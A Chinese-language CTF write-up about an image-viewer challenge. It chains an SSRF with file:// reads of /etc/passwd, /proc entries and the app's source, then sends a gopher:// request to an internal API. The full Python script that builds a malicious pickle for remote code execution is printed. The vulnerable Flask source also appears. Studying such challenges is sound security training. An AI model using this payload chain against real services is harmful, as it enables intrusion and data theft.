![截圖 2026-08-05 上午10.32.16](https://hackmd.io/_uploads/ryT3lQg8fl.png)
從JavaScript的code可以看到他洩漏了資料流，所以我在這邊做了3個推論
1. 表單是 POST 到 /,參數名為 url
2. 回傳結構有兩個欄位:image_data 和 error
3. image_data 直接餵給 `<img src>`,格式應為 data URI(base64 內嵌)

首先可以看到error欄位它代表後端會把錯誤訊息原樣回傳給前端。對攻擊者來說,這等於一個免費的探測回饋管道——連線失敗、檔案不存在、協定不支援,它都會告訴我原因

觀察完程式碼後，接下來我要來行為測試
![截圖 2026-08-05 上午10.48.39](https://hackmd.io/_uploads/S1D547gLGx.png)
輸入了這個測試的網址，接著我打開原始碼可以看到 image_data,會看到一串 base64，因為程式碼的邏輯是
```
if (state.image_data) { preview.src = state.image_data; }   // 有資料 → 塞進 <img>
if (state.error)      { error.textContent = state.error; }   // 有錯誤 → 顯示紅字
```
![截圖 2026-08-05 上午10.51.44](https://hackmd.io/_uploads/H1aBrQgLMx.png)
從畫面上可以看到有一串base64編碼，那這邊我們可以得知它不驗證是不是圖片,整個回應內容都 base64 塞進 data URI 給我。 這邊我認為 SSRF 的結果完全可讀
再來我測試`file:///etc/passwd`
![截圖 2026-08-05 中午12.31.01](https://hackmd.io/_uploads/Byf9nEgLfx.png)
可以看到這串base64開頭是cm9vdDp4OjA6MDpyb290，解碼出來是`root:x:0:0:root`
這代表我可以任意讀取，接下來我要找出內部服務，因為題目說後端似乎還掛著別的內部服務，但我目前不知道是哪個port。
#### 2.測試
所以我用`file`讀 Linux 的網路狀態表
```
file:///proc/net/tcp
```
![截圖 2026-08-05 中午12.58.49](https://hackmd.io/_uploads/r1IfmrxUGx.png)
把這串baser64解碼後可以看到
![截圖 2026-08-05 下午1.00.18](https://hackmd.io/_uploads/SJW_mHlLfg.png)
可以看到正是 /proc/net/tcp 的表頭。資料拿到了,只差解碼。
所以我打開主控台進行解碼
```
atob(document.getElementById('preview').src.split('base64,')[1])
```
![截圖 2026-08-05 下午1.20.56](https://hackmd.io/_uploads/SJEHurxUzl.png)
在畫面中可以看到他會印出一大張表，但實際上我只要看兩個欄位
| 欄位 | 意義 |
| :--- | :--- |
| `local_address` | 本機在哪個 IP:Port 上 |
| `st` | 狀態。`0A` = `LISTEN`（正在等人來連） |

所以我們只挑 st 是 0A 的那幾行,其他都是已建立的連線

![截圖 2026-08-05 下午1.25.20](https://hackmd.io/_uploads/HkaBYSlLGg.png)
可以看到0BB8就是我們的目標
接下來我繼續使用主控台因為他可以幫我篩
```
atob(document.getElementById('preview').src.split('base64,')[1])
  .split('\n').filter(l => l.includes(' 0A ')).forEach(l => console.log(l))
```
![截圖 2026-08-05 下午1.29.45](https://hackmd.io/_uploads/B1DIcSeUfg.png)
可以看到畫面上是十六進制，所以我們要把它轉成人類看得懂的

這邊可以發現，格式是 IP:PORT,兩個都是十六進位,而且 IP 的位元組順序是反的

好，接下來我們來拆解`0100007F:0BB8`
先看冒號前面的 IP(8 個字元,每 2 個一組):
```
01 00 00 7F
```
反過來讀：
```
7F 00 00 01
```
每組轉十進位:
0x7F = 127
0x00 = 0
0x00 = 0
0x01 = 1
        → 127.0.0.1
再看冒號後面的 Port:
0x0BB8 = 11×256 + 11×16 + 8 = 3000
A:`127.0.0.1:3000`

接下來我們把三筆都先變成我們看得懂的
| 原始 | IP | Port | 是什麼 |
| :--- | :--- | :--- | :--- |
| `00000000:3419` | `0.0.0.0` | `13337` | 就是我正在用的這個 Image Viewer |
| `0B00007F:B5E9` | `127.0.0.11` | `46569` | Docker 內建的 DNS,不是目標 |
| `0100007F:0BB8` | `127.0.0.1` | `3000` | 就是這個 |

再來我要解釋為什麼3000是目標
首先先看ip欄位的差別
| IP | 意思 |
| :--- | :--- |
| `0.0.0.0` | 綁在所有網卡 → 外面連得到 |
| `127.0.0.1` | 只綁 `loopback` → 只有伺服器自己連得到 |

127.0.0.1:3000 是刻意只開放給本機的服務。
接下來我要來驗證，我在輸入框輸入`http://127.0.0.1:3000/`
![截圖 2026-08-05 下午2.22.57](https://hackmd.io/_uploads/Ske08UeIMl.png)
接下來就會看到這串base 64
![截圖 2026-08-05 下午2.23.19](https://hackmd.io/_uploads/ByVkPIeUMl.png)
解碼後會看到Artist API
![截圖 2026-08-05 下午2.24.14](https://hackmd.io/_uploads/BknfDLgUzl.png)
至此確認內部服務存在,但我還不知道它提供哪些 API。既然 file:// 可以讀任意檔案,我決定直接把後端原始碼撈出來,而不是猜路徑。

先看容器裡跑了哪些程式,Linux 的 /proc/<PID>/cmdline 會記錄每個行程的啟動指令:
```
file:///proc/1/cmdline
file:///proc/7/cmdline
file:///proc/8/cmdline
```
一樣也是一串base64
解碼後得到：
| PID | 內容 |
| :--- | :--- |
| `1` | `/bin/sh /start.sh` |
| `7` | `python3 /app/artist_api.py` |
| `8` | `python3 /app/viewer.py` |
    
這邊可以發現兩支服務跑在同一個容器內,所以才能透過 loopback 互連，然後檔案路徑直接曝光，所以導致我可以更精準的把原始碼讀出來
    
接著我讀了原始碼
```
file:///app/viewer.py
file:///app/artist_api.py
```
![截圖 2026-08-05 下午2.44.20](https://hackmd.io/_uploads/BkMAj8eLGl.png)

![截圖 2026-08-05 下午2.49.18](https://hackmd.io/_uploads/By-bTUl8Me.png)

接下來我要把base64解碼，取得原始碼
viewer.py :
```python    
import base64
import socket
from pathlib import Path
from urllib.parse import unquote, urlparse

import requests
from flask import Flask, render_template, request

APP_DIR = Path(__file__).resolve().parent
TEMPLATE_DIR = APP_DIR / "templates"
if not TEMPLATE_DIR.exists():
    TEMPLATE_DIR = APP_DIR.parent / "templates"

app = Flask(__name__, template_folder=str(TEMPLATE_DIR))


def fetch_http(target):
    response = requests.get(
        target,
        timeout=3,
        allow_redirects=True,
        headers={"User-Agent": "Image Viewer"},
    )
    return response.content, response.headers.get("Content-Type", "")


def fetch_file(target):
    parsed = urlparse(target)
    path = Path(unquote(parsed.path))
    return path.read_bytes(), "application/octet-stream"


def fetch_gopher(target):
    parsed = urlparse(target)
    host = parsed.hostname or ""
    port = parsed.port or 70
    selector = parsed.path or "/"
    if selector.startswith("/_"):
        payload = unquote(selector[2:]).encode("latin-1", "ignore")
    else:
        payload = unquote(selector.lstrip("/")).encode("latin-1", "ignore")
    data = b""
    with socket.create_connection((host, port), timeout=3) as client:
        client.sendall(payload + b"\r\n")
        while True:
            chunk = client.recv(4096)
            if not chunk:
                break
            data += chunk
    return data, "application/octet-stream"


def fetch_target(target):
    parsed = urlparse(target)
    if parsed.scheme in {"http", "https"}:
        return fetch_http(target)
    if parsed.scheme == "file":
        return fetch_file(target)
    if parsed.scheme == "gopher":
        return fetch_gopher(target)
    raise ValueError("Unsupported scheme")


def sniff_mime(data, header):
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image/png"
    if data.startswith(b"\xff\xd8\xff"):
        return "image/jpeg"
    return "image/webp"


@app.route("/", methods=["GET", "POST"])
def index():
    context = {
        "image_data": "",
        "url_value": "",
        "error": "",
    }
    if request.method == "POST":
        target = request.form.get("url", "").strip()
        context["url_value"] = target
        try:
            data, header = fetch_target(target)
            mime = sniff_mime(data, header)
            raw_b64 = base64.b64encode(data).decode()
            context["image_data"] = f"data:{mime};base64,{raw_b64}"
        except Exception as exc:
            context["error"] = str(exc)
    return render_template("index.html", **context)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=13337)

```
    
artist_api.py
    
```python
import base64
import html
import pickle

from flask import Flask, jsonify, request

app = Flask(__name__)


class Artist:
    def __init__(self, name, twitter, age, country):
        self.name = name
        self.twitter = twitter
        self.age = age
        self.country = country

    def to_dict(self):
        return {
            "name": self.name,
            "twitter": self.twitter,
            "age": self.age,
            "country": self.country,
        }


def normalize(value):
    if hasattr(value, "to_dict"):
        return value.to_dict()
    if isinstance(value, dict):
        return {str(k): str(v) for k, v in value.items()}
    if isinstance(value, bytes):
        return {"result": value.decode("utf-8", "ignore")}
    return {"result": str(value)}


@app.get("/")
def home():
    return "Artist API"


@app.post("/api/create")
def create():
    artist = Artist(
        request.form.get("name", "unknown"),
        request.form.get("twitter", "@unknown"),
        request.form.get("age", "0"),
        request.form.get("country", "unknown"),
    )
    blob = base64.b64encode(pickle.dumps(artist)).decode()
    return jsonify({"blob": blob})


@app.post("/api/view")
def view():
    blob = request.form.get("blob", "")
    if not blob:
        return "Missing blob", 400
    value = pickle.loads(base64.b64decode(blob))
    data = normalize(value)
    rows = "".join(
        f"<li><strong>{html.escape(str(key))}</strong
```
有了原始碼後，再來我們來分析漏洞，首先我觀察到了Artist API:不安全的反序列化
    
```
@app.post("/api/view")
def view():
    blob = request.form.get("blob", "")
    value = pickle.loads(base64.b64decode(blob))    # ← 漏洞
    data = normalize(value)
```
pickle.loads() 直接處理使用者可控的輸入。
    
pickle 是 Python 的物件序列化格式,它的規格允許透過 __reduce__ 指定「反序列化時要呼叫哪個函式」。因此對不可信輸入呼叫 pickle.loads() 等同於任意程式碼執行。
另外我注意到 normalize() 會把結果轉成 {"result": str(value)} 並渲染進 HTML:
```
def normalize(value):
    ...
    return {"result": str(value)}
```
這代表我執行指令的結果會直接回顯在頁面上,不需要另外架伺服器接外連。
再來， Viewer:未限制 URL scheme   
```
def fetch_target(target):
    if parsed.scheme in {"http", "https"}: return fetch_http(target)
    if parsed.scheme == "file":            return fetch_file(target)     # 任意檔案讀取
    if parsed.scheme == "gopher":          return fetch_gopher(target)   # 任意 TCP

def fetch_gopher(target):
    if selector.startswith("/_"):
        payload = unquote(selector[2:]).encode("latin-1", "ignore")
    ...
    with socket.create_connection((host, port), timeout=3) as client:
        client.sendall(payload + b"\r\n")     # 內容完全可以由我控制
```
gopher:// 提供的是 raw socket 寫入能力——它把 URL 路徑的內容原樣送進 TCP 連線。
    
接下來我要把兩個漏洞串接在一起
目前我遇到一個問題/api/view 需要 POST,但 SSRF 的 HTTP 分支只會 requests.get(),沒辦法送 POST。
但我發現gopher:// 不受 HTTP 語意限制。既然它是 raw socket,我可以自己手寫完整的 HTTP 請求——包含請求方法、標頭、body,全部自己組。
```
SSRF(只能 GET)  ──gopher 升級──→  可送任意 HTTP 請求  ──→  觸發 pickle RCE
```
再來我要構造惡意Payload
```
class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('要執行的指令').read()",))

```
＿reduce＿ 回傳 (函式, 參數),pickle 在反序列化時會執行 函式(*參數)。
再來我要組裝 gopher URL  
```python
import base64, pickle, os, sys
from urllib.parse import quote

cmd = sys.argv[1]

class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').popen(%r).read()" % cmd,))

blob = base64.b64encode(pickle.dumps(RCE())).decode()
body = "blob=" + quote(blob, safe="")
raw = ("POST /api/view HTTP/1.1\r\n"
       "Host: 127.0.0.1:3000\r\n"
       "Content-Type: application/x-www-form-urlencoded\r\n"
       f"Content-Length: {len(body)}\r\n"
       "Connection: close\r\n\r\n" + body)
print("gopher://127.0.0.1:3000/_" + quote(raw, safe=""))
```    
有兩個編碼細節必須處理正確:
| 細節 | 原因 |
| :--- | :--- |
| 路徑前綴 `/_` | 原始碼中 `selector.startswith("/_")` 決定的分隔符 |
| 雙層編碼 | `base64` 含 `+` `/` `=`，先做一次 form-encode；整個 HTTP 請求再做一次 URL-encode（`\r\n` → `%0D%0A`），因為 `fetch_gopher()` 會 `unquote()` 一次還原 |

接下來我執行了腳本
![截圖 2026-08-05 下午3.26.59](https://hackmd.io/_uploads/rJzCHwlIfg.png)
我把執行結果貼回去，然後解碼結果是
![截圖 2026-08-05 下午3.36.49](https://hackmd.io/_uploads/SyAfOvgLzx.png)
這邊證明了我們RCE成功了，但仔細看flag這個檔案只有root能讀取，但我現在是viewer，所以我需要提權，不過仔細看有一個 /readflag 的權限很特別
-r-s--x--x
   ↑
   這個 s
s 代表 SUID(Set User ID) ——不管誰執行這支程式,都以檔案擁有者(root)的身分執行。所以雖然我是 viewer,執行它的瞬間就有 root 權限,它就能替我讀出 /flag。
    
首先先跑腳本
![截圖 2026-08-05 下午3.46.09](https://hackmd.io/_uploads/H1JU5DxUfx.png)
接下來把gopher這串貼回去，會得到這一串base64
![截圖 2026-08-05 下午3.45.51](https://hackmd.io/_uploads/HJ6E9wg8Gg.png)
接下來我把這串base64解碼，就會得到flag
![截圖 2026-08-05 下午3.47.41](https://hackmd.io/_uploads/Bycs9PlUfx.png)
Flag:FLAG{king_of_ssrf_king_of_all}